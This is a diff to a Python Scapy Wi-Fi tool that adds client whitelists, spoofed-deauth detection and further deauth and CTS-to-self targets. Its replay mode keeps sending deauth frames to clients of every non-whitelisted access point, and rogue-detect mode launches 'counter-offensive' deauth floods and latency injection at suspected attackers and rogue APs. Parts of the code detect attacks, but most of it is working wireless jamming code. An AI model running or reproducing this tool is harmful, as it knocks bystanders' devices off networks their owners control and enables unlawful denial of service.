@@ -126,22 +126,24 @@ def check_interface(iface):
 
 def load_whitelist():
     """Load whitelist. Supports multiple formats:
-    - New: {bssid: {"ssid": ..., "channel": ...}}  (dict of dicts)
+    - New: {bssid: {"ssid": ..., "channel": ..., "allowed_clients": {mac: name}}}
     - Mid: {bssid: ssid, ...}                       (dict of strings)
-    - Old: [bssid, ...]                              (list)"""
+    - Old: [bssid, ...]                              (list)
+    Missing 'allowed_clients' is defaulted to {} (empty = no client filtering)."""
     if not os.path.isfile(WHITELIST_FILE):
         return {}
     with open(WHITELIST_FILE, "r") as f:
         data = json.load(f)
     if isinstance(data, list):
-        return {b: {"ssid": "<unknown>", "channel": None} for b in data}
+        return {b: {"ssid": "<unknown>", "channel": None, "allowed_clients": {}} for b in data}
     # Check if values are dicts (new format) or strings (mid format)
     result = {}
     for bssid, val in data.items():
         if isinstance(val, dict):
+            val.setdefault("allowed_clients", {})
             result[bssid] = val
         else:
-            result[bssid] = {"ssid": val, "channel": None}
+            result[bssid] = {"ssid": val, "channel": None, "allowed_clients": {}}
     return result
 
 
@@ -198,8 +200,76 @@ def scan_bssids(capture_iface, scan_time=30, use_5ghz=False):
     return discovered
 
 
+def scan_clients(capture_iface, bssids, scan_time=30, use_5ghz=False):
+    """Scan for clients connected to specific BSSIDs by sniffing data frames.
+    Returns {bssid: {client_mac, ...}} for each target BSSID."""
+    # Gather channels to scan from the BSSID info
+    bssid_set = set(b.lower() for b in bssids.keys())
+    channels_needed = set()
+    for info in bssids.values():
+        ch = info.get("channel")
+        if ch:
+            channels_needed.add(ch)
+    if not channels_needed:
+        channels_needed = set(CHANNELS_24)
+        if use_5ghz:
+            channels_needed.update(CHANNELS_5)
+    channels_needed = sorted(channels_needed)
+
+    clients = {b.lower(): set() for b in bssids.keys()}
+    current_ch = [1]
+
+    def _handle_pkt(pkt):
+        if not pkt.haslayer(Dot11):
+            return
+        dot11 = pkt.getlayer(Dot11)
+        addr1 = (dot11.addr1 or "").lower()
+        addr2 = (dot11.addr2 or "").lower()
+        addr3 = (dot11.addr3 or "").lower()
+
+        # Data frames: addr3 is BSSID for ToDS/FromDS
+        bssid, client = None, None
+        if addr3 in bssid_set and addr3 != "ff:ff:ff:ff:ff:ff":
+            bssid = addr3
+            if addr2 != bssid:
+                client = addr2
+            elif addr1 != bssid and addr1 != "ff:ff:ff:ff:ff:ff":
+                client = addr1
+        elif addr1 in bssid_set and addr2 not in bssid_set:
+            bssid = addr1
+            client = addr2
+
+        if bssid and client and client != "ff:ff:ff:ff:ff:ff" and client not in bssid_set:
+            if client not in clients[bssid]:
+                clients[bssid].add(client)
+                ssid = bssids.get(bssid, bssids.get(bssid.upper(), {})).get("ssid", "?")
+                print(colored("    [+] Client: {} → {} ({})".format(
+                    client, bssid, ssid), "green"))
+
+    per_channel = max(1, scan_time / len(channels_needed))
+    total_ch = len(channels_needed)
+    print(colored("\n[*] Scanning clients on {} channel(s) ({} s) ...".format(
+        total_ch, scan_time), "cyan"))
+    for i, ch in enumerate(channels_needed, start=1):
+        current_ch[0] = ch
+        print(colored("    [ch {}/{}] Scanning channel {} ...".format(
+            i, total_ch, ch), "white"), end="\r")
+        subprocess.run(
+            ["iw", "dev", capture_iface, "set", "channel", str(ch)],
+            check=False,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        sniff(iface=capture_iface, count=50, timeout=per_channel, prn=_handle_pkt)
+
+    total_clients = sum(len(c) for c in clients.values())
+    print(colored("[*] Client scan complete: {} client(s) found.".format(total_clients), "cyan"))
+    return clients
+
+
 def mode_scan_whitelist(capture_iface, scan_time=30, use_5ghz=False):
-    """Interactive mode: display BSSIDs, let user pick whitelist entries."""
+    """Interactive mode: display BSSIDs, let user pick whitelist entries,
+    then scan clients and let user select allowed clients per BSSID."""
     discovered = scan_bssids(capture_iface, scan_time, use_5ghz)
 
     if not discovered:
@@ -268,13 +338,102 @@ def mode_scan_whitelist(capture_iface, scan_time=30, use_5ghz=False):
         print(colored("[!] No valid BSSIDs selected.", "red"))
         return
 
-    # Save as {bssid: {"ssid": ..., "channel": ...}} mapping
-    whitelist_dict = {b: discovered[b] for b in chosen}
+    # Build initial whitelist dict
+    whitelist_dict = {b: dict(discovered[b]) for b in chosen}
+
+    # ── Step 2 : Client scanning & allowed_clients selection ──
+    print(colored("\n[?] Scan for clients connected to selected BSSIDs? [y/N]", "cyan"))
+    scan_answer = input(">>> ").strip().lower()
+
+    if scan_answer == "y":
+        chosen_info = {b: discovered[b] for b in chosen}
+        client_results = scan_clients(capture_iface, chosen_info, scan_time=scan_time, use_5ghz=use_5ghz)
+
+        # Load existing whitelist for 'keep' option
+        existing_wl = load_whitelist()
+
+        for bssid in chosen:
+            bssid_lower = bssid.lower()
+            ssid = discovered[bssid]["ssid"]
+            found_clients = sorted(client_results.get(bssid_lower, set()))
+
+            print(colored("\n── {} ({}) ──".format(bssid, ssid), "cyan", attrs=["bold"]))
+
+            if not found_clients:
+                print(colored("    No clients detected.", "yellow"))
+                # Check if we have existing allowed_clients
+                existing_ac = existing_wl.get(bssid, {}).get("allowed_clients", {})
+                if existing_ac:
+                    print(colored("    Existing allowed clients:", "white"))
+                    for mac, name in sorted(existing_ac.items()):
+                        print("      └─ {} ({})".format(mac, name))
+                    print(colored("    [?] keep = keep existing | none = clear", "cyan"))
+                    ac_choice = input("    >>> ").strip().lower()
+                    if ac_choice == "keep":
+                        whitelist_dict[bssid]["allowed_clients"] = dict(existing_ac)
+                    else:
+                        whitelist_dict[bssid]["allowed_clients"] = {}
+                else:
+                    whitelist_dict[bssid]["allowed_clients"] = {}
+                continue
+
+            # Display found clients
+            print(colored("    #   Client MAC", "yellow"))
+            print(colored("    " + "-" * 30, "yellow"))
+            for cidx, cmac in enumerate(found_clients, start=1):
+                print("    {:<4} {}".format(cidx, cmac))
+
+            # Check existing allowed_clients
+            existing_ac = existing_wl.get(bssid, {}).get("allowed_clients", {})
+            options = "none / all / comma-separated numbers"
+            if existing_ac:
+                options += " / keep"
+                print(colored("    Existing allowed clients:", "white"))
+                for mac, name in sorted(existing_ac.items()):
+                    print("      └─ {} ({})".format(mac, name))
+
+            print(colored("    [?] Select allowed clients ({}):".format(options), "cyan"))
+            ac_input = input("    >>> ").strip().lower()
+
+            if ac_input == "none":
+                whitelist_dict[bssid]["allowed_clients"] = {}
+            elif ac_input == "all":
+                ac_dict = {}
+                for cmac in found_clients:
+                    name = input(colored("    Name for {} (Enter=skip): ".format(cmac), "white")).strip()
+                    ac_dict[cmac] = name if name else cmac
+                whitelist_dict[bssid]["allowed_clients"] = ac_dict
+            elif ac_input == "keep" and existing_ac:
+                whitelist_dict[bssid]["allowed_clients"] = dict(existing_ac)
+            else:
+                ac_dict = {}
+                for part in ac_input.split(","):
+                    part = part.strip()
+                    if part.isdigit():
+                        idx = int(part)
+                        if 1 <= idx <= len(found_clients):
+                            cmac = found_clients[idx - 1]
+                            name = input(colored("    Name for {} (Enter=skip): ".format(cmac), "white")).strip()
+                            ac_dict[cmac] = name if name else cmac
+                        else:
+                            print(colored("    [!] Skipping invalid index: " + part, "red"))
+                    else:
+                        print(colored("    [!] Skipping non-numeric input: " + part, "red"))
+                whitelist_dict[bssid]["allowed_clients"] = ac_dict
+    else:
+        # No client scan — preserve existing allowed_clients or set empty
+        existing_wl = load_whitelist()
+        for bssid in chosen:
+            existing_ac = existing_wl.get(bssid, {}).get("allowed_clients", {})
+            whitelist_dict[bssid]["allowed_clients"] = dict(existing_ac)
+
     save_whitelist(whitelist_dict)
-    print(colored("[+] Whitelist saved ({} BSSIDs):".format(len(chosen)), "green"))
+    print(colored("\n[+] Whitelist saved ({} BSSIDs):".format(len(chosen)), "green"))
     for b in chosen:
-        info = discovered[b]
-        print("    {} ({}) ch={}".format(b, info["ssid"], info["channel"]))
+        info = whitelist_dict[b]
+        ac_count = len(info.get("allowed_clients", {}))
+        ac_label = "{} client(s)".format(ac_count) if ac_count else "no client filter"
+        print("    {} ({}) ch={} — {}".format(b, info["ssid"], info.get("channel", "?"), ac_label))
 
 
 # ──────────────────────────────────────────────
@@ -330,6 +489,15 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
     ap_clients = {}
     clients_lock = threading.Lock()
 
+    # Unauthorized client tracking (allowed_clients filtering)
+    wl_clients = {}  # bssid -> set of allowed client MACs (empty = no filter)
+    for bssid, info in whitelist.items():
+        ac = info.get("allowed_clients", {})
+        if ac:
+            wl_clients[bssid.lower()] = set(m.lower() for m in ac.keys())
+    unauth_clients = {}  # bssid -> {"ssid": str, "clients": set()}
+    unauth_lock = threading.Lock()
+
     def _is_protected(bssid):
         """Check if a BSSID is whitelisted or a VAP sibling of a whitelisted AP."""
         if bssid in whitelist_set or bssid in vap_protected:
@@ -351,7 +519,11 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
 
     print(colored("[+] Whitelist loaded ({} BSSIDs) \u2014 these will be EXCLUDED:".format(len(whitelist)), "green"))
     for b, info in whitelist.items():
-        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
+        ac_count = len(info.get("allowed_clients", {}))
+        ac_label = " \u2014 {} allowed client(s)".format(ac_count) if ac_count else ""
+        print("    {} ({}) ch={}{}".format(b, info["ssid"], info.get("channel", "?"), ac_label))
+    if wl_clients:
+        print(colored("[*] Client filter : {} BSSID(s) with allowed_clients".format(len(wl_clients)), "cyan"))
     print(colored("[*] Capture iface : " + capture_iface, "cyan"))
     print(colored("[*] Replay  iface : " + replay_iface, "cyan"))
     print(colored("[*] Channels      : {} ({} ch)".format(
@@ -409,6 +581,36 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
                                   colored(" \u2192 ", "yellow") +
                                   colored("{} ({})".format(bssid, ssid), "cyan"))
 
+            # ---- Unauthorized client detection on whitelisted BSSIDs ----
+            if wl_clients:
+                addr1, addr2, addr3 = addrs
+                uc_bssid, uc_client = None, None
+                if addr3 in wl_clients and addr3 != "ff:ff:ff:ff:ff:ff":
+                    uc_bssid = addr3
+                    if addr2 != uc_bssid:
+                        uc_client = addr2
+                    elif addr1 != uc_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
+                        uc_client = addr1
+                elif addr1 in wl_clients and addr2 not in whitelist_set:
+                    uc_bssid = addr1
+                    uc_client = addr2
+                if (uc_bssid and uc_client
+                        and uc_client != "ff:ff:ff:ff:ff:ff"
+                        and uc_client not in whitelist_set
+                        and uc_client not in vap_protected
+                        and uc_client not in wl_clients[uc_bssid]):
+                    with unauth_lock:
+                        if uc_bssid not in unauth_clients:
+                            uc_ssid = whitelist.get(uc_bssid, whitelist.get(uc_bssid.upper(), {})).get("ssid", "<unknown>")
+                            unauth_clients[uc_bssid] = {"ssid": uc_ssid, "clients": set()}
+                        if uc_client not in unauth_clients[uc_bssid]["clients"]:
+                            unauth_clients[uc_bssid]["clients"].add(uc_client)
+                            uc_ssid = unauth_clients[uc_bssid]["ssid"]
+                            print(colored("  [!] Unauthorized client: ", "red") +
+                                  colored(uc_client, "white") +
+                                  colored(" \u2192 ", "yellow") +
+                                  colored("{} ({})".format(uc_bssid, uc_ssid), "red"))
+
             # ---- Buffer for replay (exclude whitelisted + VAP siblings) ----
             if not any(_is_protected(a) for a in addrs if a):
                 buf.add(pkt, current_channel[0])
@@ -432,7 +634,7 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
     # ── Deauth thread ──
     def deauth_loop():
         """Continuously send deauth frames between non-whitelisted BSSIDs
-        and their detected clients."""
+        and their detected clients, plus unauthorized clients on whitelisted BSSIDs."""
         while not stop_event.is_set():
             with clients_lock:
                 targets = [
@@ -440,6 +642,14 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
                     for bssid, info in ap_clients.items()
                     if info["clients"]
                 ]
+            # Also deauth unauthorized clients from whitelisted BSSIDs
+            with unauth_lock:
+                unauth_targets = [
+                    (bssid, list(info["clients"]))
+                    for bssid, info in unauth_clients.items()
+                    if info["clients"]
+                ]
+            targets.extend(unauth_targets)
             if not targets:
                 time.sleep(2)
                 continue
@@ -519,6 +729,24 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
                 print(colored("  AP {} ({})".format(bssid, info["ssid"]), "cyan") +
                       colored(" \u2014 {} client(s)".format(len(info["clients"])), "white"))
                 for c in sorted(info["clients"]):
+                    print("      \u2514\u2500 " + c)
+
+        # -- Unauthorized client summary --
+        with unauth_lock:
+            unauth_count = sum(len(v["clients"]) for v in unauth_clients.values())
+            unauth_snapshot = {
+                b: {"ssid": info["ssid"], "clients": sorted(info["clients"])}
+                for b, info in unauth_clients.items()
+            }
+        if unauth_count:
+            print(colored(
+                "[*] Unauthorized clients: {} client(s) deauthed from whitelisted BSSID(s)".format(unauth_count),
+                "red", attrs=["bold"],
+            ))
+            for ub, info in sorted(unauth_snapshot.items()):
+                print(colored("  AP {} ({})".format(ub, info["ssid"]), "cyan") +
+                      colored(" \u2014 {} unauthorized".format(len(info["clients"])), "red"))
+                for c in info["clients"]:
                     print("      \u2514\u2500 " + c)
 
         # -- Replay --
@@ -640,6 +868,33 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
     backhaul_client_count = [0]
     backhaul_deauth_count = [0]
     rogue_vap_count = [0]
+    # Deauth defense: track attacker MACs and protected BSSIDs under attack
+    deauth_attackers = {}   # attacker_mac -> {"targets": set(bssid), "clients": set(client_mac)}
+    deauth_defense_bssids = set()  # protected BSSIDs currently under deauth attack → CTS-to-self
+    deauth_defense_lock = threading.Lock()
+    # Spoofed deauth detection: SC tracking, RSSI baseline, deauth rate
+    DEAUTH_RATE_WINDOW = 10    # seconds
+    DEAUTH_RATE_THRESHOLD = 5  # deauth frames in window → flood
+    SC_TOLERANCE = 50          # max acceptable SC gap before anomaly
+    RSSI_TOLERANCE = 15        # dBm deviation from baseline
+    sc_tracker = {}       # bssid -> last_seen_SC (from beacons/data)
+    rssi_tracker = {}     # bssid -> deque of (timestamp, rssi) for rolling average
+    spoofed_deauth_log = {}  # bssid -> deque of timestamps (rolling window)
+    alerted_spoofed_deauth = set()  # bssid (already alerted per BSSID)
+    spoofed_deauth_count = [0]
+    # Unauthorized client monitoring: allowed_clients per whitelisted BSSID
+    wl_clients = {}  # bssid -> set of allowed client MACs (empty set = no filter)
+    wl_all_clients = set()  # union of all allowed client MACs across all BSSIDs
+    for bssid, info in whitelist.items():
+        ac = info.get("allowed_clients", {})
+        if ac:
+            client_set = set(m.lower() for m in ac.keys())
+            wl_clients[bssid.lower()] = client_set
+            wl_all_clients.update(client_set)
+    alerted_unauth_client = set()   # (bssid, client_mac)
+    unauth_clients = {}             # bssid -> {"ssid": str, "clients": set()}
+    unauth_client_count = [0]
+    unauth_lock = threading.Lock()
     lock = threading.Lock()
     stop_event = threading.Event()
 
@@ -651,13 +906,17 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
 
     print(colored("[+] Whitelist loaded ({} BSSIDs):".format(len(whitelist)), "green"))
     for b, info in whitelist.items():
-        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
+        ac_count = len(info.get("allowed_clients", {}))
+        ac_label = " — {} allowed client(s)".format(ac_count) if ac_count else ""
+        print("    {} ({}) ch={}{}".format(b, info["ssid"], info.get("channel", "?"), ac_label))
+    if wl_clients:
+        print(colored("[*] Client filter : {} BSSID(s) with allowed_clients".format(len(wl_clients)), "cyan"))
     print(colored("[*] Protected SSIDs: {}".format(
         ", ".join(s for s in wl_ssids.keys() if s != "<unknown>")), "cyan"))
     print(colored("[*] Channels      : {} ({} ch)".format(
         "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz only", len(channels)), "cyan"))
     print(colored("[*] Replay iface  : {} (counter-offensive on SSID spoof + evil twin)".format(replay_iface), "cyan"))
-    print(colored("[*] Monitoring for rogue APs + signal relays (Ctrl+C to stop) ...", "cyan"))
+    print(colored("[*] Monitoring for rogue APs + signal relays + unauthorized clients (Ctrl+C to stop) ...", "cyan"))
     print()
 
     current_channel = [1]
@@ -694,6 +953,23 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                 # Track all beacon BSSIDs for relay detection
                 if bssid not in beacon_bssids:
                     beacon_bssids[bssid] = ssid or "<hidden>"
+
+                # ── SC + RSSI tracking for whitelisted BSSIDs ──
+                if bssid in wl_bssids:
+                    dot11_b = pkt.getlayer(Dot11)
+                    if dot11_b and dot11_b.SC is not None:
+                        sc_tracker[bssid] = (dot11_b.SC >> 4) & 0xFFF
+                    # Extract RSSI from RadioTap header
+                    if pkt.haslayer(RadioTap):
+                        try:
+                            rssi = pkt[RadioTap].dBm_AntSignal
+                        except (AttributeError, IndexError):
+                            rssi = None
+                        if rssi is not None:
+                            now = time.time()
+                            if bssid not in rssi_tracker:
+                                rssi_tracker[bssid] = deque(maxlen=50)
+                            rssi_tracker[bssid].append((now, rssi))
 
                 # ── VAP Check C: Rogue VAP (MAC in WL range but not whitelisted) ──
                 if bssid not in wl_bssids and bssid not in vap_backhaul:
@@ -810,11 +1086,12 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
             addr2 = (dot11.addr2 or "").lower()
             addr3 = (dot11.addr3 or "").lower()
 
-            # ── VAP Check A: Deauth targeting a whitelisted or backhaul BSSID ──
+            # ── VAP Check A: Deauth targeting a whitelisted or backhaul BSSID / client ──
             if pkt.haslayer(Dot11Deauth):
                 protected = wl_bssids | vap_backhaul
                 target_bh = None
                 attacker = None
+                victim_client = None
                 # Deauth frame: addr1=destination, addr2=source, addr3=BSSID
                 if addr1 in protected:
                     target_bh = addr1
@@ -822,12 +1099,167 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                 elif addr3 in protected and addr1 not in protected:
                     target_bh = addr3
                     attacker = addr2
-                if target_bh and attacker and attacker not in protected:
+                    # addr1 is the client being deauthenticated
+                    if addr1 != "ff:ff:ff:ff:ff:ff":
+                        victim_client = addr1
+                elif addr3 in protected and addr1 in protected:
+                    # Both are protected — attacker spoofing one side
+                    target_bh = addr3
+                    attacker = addr2
+
+                # ── Case 1: Spoofed deauth (source MAC is our BSSID or our client) ──
+                if target_bh and attacker and attacker in protected:
+                    # addr2 = our BSSID — classic spoofed deauth attack
+                    # Use 3 signals: deauth rate, SC anomaly, RSSI anomaly
+                    spoofed_bssid = target_bh
+                    now = time.time()
+                    reasons = []
+
+                    # Signal 1: Deauth rate (flood detection)
                     with lock:
-                        alert_key = (attacker, target_bh)
-                        if alert_key not in alerted_backhaul_deauth:
-                            alerted_backhaul_deauth.add(alert_key)
-                            backhaul_deauth_count[0] += 1
+                        if spoofed_bssid not in spoofed_deauth_log:
+                            spoofed_deauth_log[spoofed_bssid] = deque()
+                        dlog = spoofed_deauth_log[spoofed_bssid]
+                        dlog.append(now)
+                        # Prune old entries
+                        while dlog and (now - dlog[0]) > DEAUTH_RATE_WINDOW:
+                            dlog.popleft()
+                        if len(dlog) >= DEAUTH_RATE_THRESHOLD:
+                            reasons.append("FLOOD: {} deauth in {}s".format(len(dlog), DEAUTH_RATE_WINDOW))
+
+                    # Signal 2: Sequence Number anomaly
+                    dot11_d = pkt.getlayer(Dot11)
+                    if dot11_d and dot11_d.SC is not None:
+                        deauth_sc = (dot11_d.SC >> 4) & 0xFFF
+                        with lock:
+                            expected_sc = sc_tracker.get(attacker)  # attacker=spoofed BSSID
+                        if expected_sc is not None:
+                            gap = abs(deauth_sc - expected_sc)
+                            # SC wraps at 4096
+                            if gap > 2048:
+                                gap = 4096 - gap
+                            if gap > SC_TOLERANCE:
+                                reasons.append("SC: got {} expected ~{} (gap={})".format(
+                                    deauth_sc, expected_sc, gap))
+
+                    # Signal 3: RSSI anomaly
+                    if pkt.haslayer(RadioTap):
+                        try:
+                            deauth_rssi = pkt[RadioTap].dBm_AntSignal
+                        except (AttributeError, IndexError):
+                            deauth_rssi = None
+                        if deauth_rssi is not None:
+                            with lock:
+                                rssi_samples = rssi_tracker.get(attacker)  # attacker=spoofed BSSID
+                            if rssi_samples and len(rssi_samples) >= 3:
+                                avg_rssi = sum(r for _, r in rssi_samples) / len(rssi_samples)
+                                if abs(deauth_rssi - avg_rssi) > RSSI_TOLERANCE:
+                                    reasons.append("RSSI: {} dBm vs baseline {:.0f} dBm (delta={:.0f})".format(
+                                        deauth_rssi, avg_rssi, abs(deauth_rssi - avg_rssi)))
+
+                    # If at least 1 signal confirms → spoofed deauth attack
+                    if reasons:
+                        with deauth_defense_lock:
+                            deauth_defense_bssids.add(spoofed_bssid)
+                        with lock:
+                            is_new = spoofed_bssid not in alerted_spoofed_deauth
+                            if is_new:
+                                alerted_spoofed_deauth.add(spoofed_bssid)
+                                spoofed_deauth_count[0] += 1
+                                t_ssid = beacon_bssids.get(spoofed_bssid, "<unknown>")
+                                print(colored(
+                                    "\n  [!!!] SPOOFED DEAUTH ATTACK DETECTED",
+                                    "red", attrs=["bold", "reverse"]))
+                                print(colored(
+                                    "        Target BSSID : {} ({})".format(spoofed_bssid, t_ssid),
+                                    "red", attrs=["bold"]))
+                                print(colored(
+                                    "        Spoofed src  : {} (our BSSID!)".format(attacker),
+                                    "yellow", attrs=["bold"]))
+                                if victim_client:
+                                    print(colored(
+                                        "        Victim client: {}".format(victim_client),
+                                        "yellow", attrs=["bold"]))
+                                print(colored(
+                                    "        Evidence     : {}".format(" | ".join(reasons)),
+                                    "cyan", attrs=["bold"]))
+                                print(colored(
+                                    "        Channel      : {}".format(current_channel[0]),
+                                    "yellow"))
+                                print(colored(
+                                    "        Time         : {}".format(time.strftime("%c")),
+                                    "yellow"))
+                                print(colored(
+                                    "        [>>>] CTS-TO-SELF DEFENSE ENGAGED",
+                                    "red", attrs=["bold"]))
+                                print()
+
+                # ── Case 2: Real attacker (source MAC not in protected) ──
+                elif target_bh and attacker and attacker not in protected:
+                    # Safety: don't counter-attack our own allowed clients
+                    # (attacker could spoof addr2 with a legit client MAC)
+                    if attacker in wl_all_clients:
+                        # Track in spoofed deauth log (contributes to flood detection)
+                        now = time.time()
+                        with lock:
+                            if target_bh not in spoofed_deauth_log:
+                                spoofed_deauth_log[target_bh] = deque()
+                            dlog = spoofed_deauth_log[target_bh]
+                            dlog.append(now)
+                            while dlog and (now - dlog[0]) > DEAUTH_RATE_WINDOW:
+                                dlog.popleft()
+                            is_flood = len(dlog) >= DEAUTH_RATE_THRESHOLD
+                            alert_key = (attacker, target_bh)
+                            if alert_key not in alerted_backhaul_deauth:
+                                alerted_backhaul_deauth.add(alert_key)
+                                backhaul_deauth_count[0] += 1
+                                if is_flood and target_bh not in alerted_spoofed_deauth:
+                                    alerted_spoofed_deauth.add(target_bh)
+                                    spoofed_deauth_count[0] += 1
+                                t_ssid = beacon_bssids.get(target_bh, "<backhaul>")
+                                flood_tag = " [FLOOD]" if is_flood else ""
+                                print(colored(
+                                    "\n  [!!!] DEAUTH ATTACK (spoofed client MAC){}".format(flood_tag),
+                                    "red", attrs=["bold", "reverse"]))
+                                print(colored(
+                                    "        Target BSSID : {} ({})".format(target_bh, t_ssid),
+                                    "red", attrs=["bold"]))
+                                print(colored(
+                                    "        Source MAC   : {} (ALLOWED CLIENT — spoofed)".format(attacker),
+                                    "yellow", attrs=["bold"]))
+                                if victim_client:
+                                    print(colored(
+                                        "        Victim client: {}".format(victim_client),
+                                        "yellow", attrs=["bold"]))
+                                print(colored(
+                                    "        Channel      : {}".format(current_channel[0]),
+                                    "yellow"))
+                                print(colored(
+                                    "        Time         : {}".format(time.strftime("%c")),
+                                    "yellow"))
+                                print(colored(
+                                    "        [>>>] CTS-TO-SELF DEFENSE ENGAGED",
+                                    "red", attrs=["bold"]))
+                                print()
+                        # Protect the BSSID with CTS-to-self (safe — just reserves medium)
+                        with deauth_defense_lock:
+                            deauth_defense_bssids.add(target_bh)
+                    else:
+                        with lock:
+                            alert_key = (attacker, target_bh)
+                            is_new = alert_key not in alerted_backhaul_deauth
+                            if is_new:
+                                alerted_backhaul_deauth.add(alert_key)
+                                backhaul_deauth_count[0] += 1
+                        # Register attacker for counter-offensive (always, even if already alerted)
+                        with deauth_defense_lock:
+                            if attacker not in deauth_attackers:
+                                deauth_attackers[attacker] = {"targets": set(), "clients": set()}
+                            deauth_attackers[attacker]["targets"].add(target_bh)
+                            if victim_client:
+                                deauth_attackers[attacker]["clients"].add(victim_client)
+                            deauth_defense_bssids.add(target_bh)
+                        if is_new:
                             t_ssid = beacon_bssids.get(target_bh, "<backhaul>")
                             print(colored(
                                 "\n  [!!!] DEAUTH ATTACK ON PROTECTED BSSID",
@@ -838,12 +1270,19 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                             print(colored(
                                 "        Attacker MAC : {}".format(attacker),
                                 "red", attrs=["bold"]))
+                            if victim_client:
+                                print(colored(
+                                    "        Victim client: {}".format(victim_client),
+                                    "yellow", attrs=["bold"]))
                             print(colored(
                                 "        Channel      : {}".format(current_channel[0]),
                                 "yellow"))
                             print(colored(
                                 "        Time         : {}".format(time.strftime("%c")),
                                 "yellow"))
+                            print(colored(
+                                "        [>>>] DEAUTH DEFENSE ENGAGED",
+                                "red", attrs=["bold"]))
                             print()
 
             with lock:
@@ -875,6 +1314,56 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                                   colored(client_mac, "white") +
                                   colored(" → ", "yellow") +
                                   colored("{} ({})".format(target_bssid, r_ssid), "red"))
+
+            # ── Unauthorized client detection on whitelisted BSSIDs ──
+            if wl_clients:
+                uc_bssid = None
+                uc_client = None
+                if addr3 in wl_clients and addr3 != "ff:ff:ff:ff:ff:ff":
+                    uc_bssid = addr3
+                    if addr2 != uc_bssid:
+                        uc_client = addr2
+                    elif addr1 != uc_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
+                        uc_client = addr1
+                elif addr1 in wl_clients and addr2 not in wl_bssids:
+                    uc_bssid = addr1
+                    uc_client = addr2
+
+                if (uc_bssid and uc_client
+                        and uc_client != "ff:ff:ff:ff:ff:ff"
+                        and uc_client not in wl_bssids
+                        and uc_client not in vap_backhaul
+                        and not any(is_same_ap_vap(uc_client, wb) for wb in wl_bssids)
+                        and uc_client not in wl_clients[uc_bssid]):
+                    with unauth_lock:
+                        alert_key = (uc_bssid, uc_client)
+                        if alert_key not in alerted_unauth_client:
+                            alerted_unauth_client.add(alert_key)
+                            unauth_client_count[0] += 1
+                            if uc_bssid not in unauth_clients:
+                                uc_ssid = whitelist.get(uc_bssid, whitelist.get(uc_bssid.upper(), {})).get("ssid", "<unknown>")
+                                unauth_clients[uc_bssid] = {"ssid": uc_ssid, "clients": set()}
+                            unauth_clients[uc_bssid]["clients"].add(uc_client)
+                            uc_ssid = unauth_clients[uc_bssid]["ssid"]
+                            print(colored(
+                                "\n  [!!!] UNAUTHORIZED CLIENT DETECTED",
+                                "red", attrs=["bold", "reverse"]))
+                            print(colored(
+                                "        BSSID       : {} ({})".format(uc_bssid, uc_ssid),
+                                "cyan", attrs=["bold"]))
+                            print(colored(
+                                "        Client MAC  : {}".format(uc_client),
+                                "red", attrs=["bold"]))
+                            print(colored(
+                                "        Channel     : {}".format(current_channel[0]),
+                                "yellow"))
+                            print(colored(
+                                "        Time        : {}".format(time.strftime("%c")),
+                                "yellow"))
+                            print(colored(
+                                "        [>>>] DEAUTH ENGAGED",
+                                "red", attrs=["bold"]))
+                            print()
 
             # ── Relay/repeater detection (data frames only) ──
             if dot11.type == 2:
@@ -982,17 +1471,36 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
     cap_thread = threading.Thread(target=capture_loop, daemon=True)
     cap_thread.start()
 
-    # ── Deauth thread (counter-offensive on rogue spoof BSSIDs) ──
+    # ── Deauth thread (counter-offensive on rogue spoof BSSIDs + unauthorized + deauth attackers) ──
     def deauth_loop():
-        """Continuously deauth clients from rogue BSSIDs (SSID spoof + evil twin)."""
+        """Continuously deauth clients from rogue BSSIDs, unauthorized
+        clients from whitelisted BSSIDs, and deauth attackers."""
         while not stop_event.is_set():
+            # Rogue AP clients
             with rogue_lock:
                 targets = [
                     (bssid, list(info["clients"]))
                     for bssid, info in rogue_clients.items()
                     if info["clients"]
                 ]
-            if not targets:
+            # Unauthorized clients on whitelisted BSSIDs
+            with unauth_lock:
+                unauth_targets = [
+                    (bssid, list(info["clients"]))
+                    for bssid, info in unauth_clients.items()
+                    if info["clients"]
+                ]
+            targets.extend(unauth_targets)
+
+            # Deauth defense: deauth the attacker from the protected BSSID
+            # Only send AP→attacker direction (not reverse, to avoid disrupting our own AP)
+            defense_targets = []
+            with deauth_defense_lock:
+                for attacker_mac, info in deauth_attackers.items():
+                    for target_bssid in info["targets"]:
+                        defense_targets.append((target_bssid, attacker_mac))
+
+            if not targets and not defense_targets:
                 time.sleep(2)
                 continue
 
@@ -1013,23 +1521,39 @@ def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
                         sendp(deauth_cl, iface=replay_iface, count=3, inter=0.02, verbose=False)
                     except Exception:
                         pass
+
+            # Defense deauth: only AP→attacker (safe direction)
+            for target_bssid, attacker_mac in defense_targets:
+                if stop_event.is_set():
+                    return
+                deauth_def = RadioTap() / Dot11(
+                    addr1=attacker_mac, addr2=target_bssid, addr3=target_bssid
+                ) / Dot11Deauth(reason=7)
+                try:
+                    sendp(deauth_def, iface=replay_iface, count=5, inter=0.02, verbose=False)
+                except Exception:
+                    pass
             time.sleep(1)
 
     deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
     deauth_thread.start()
 
-    # ── Latency injection thread (CTS-to-self on rogue spoof BSSIDs) ──
+    # ── Latency injection thread (CTS-to-self on rogue BSSIDs + deauth defense) ──
     def latency_loop():
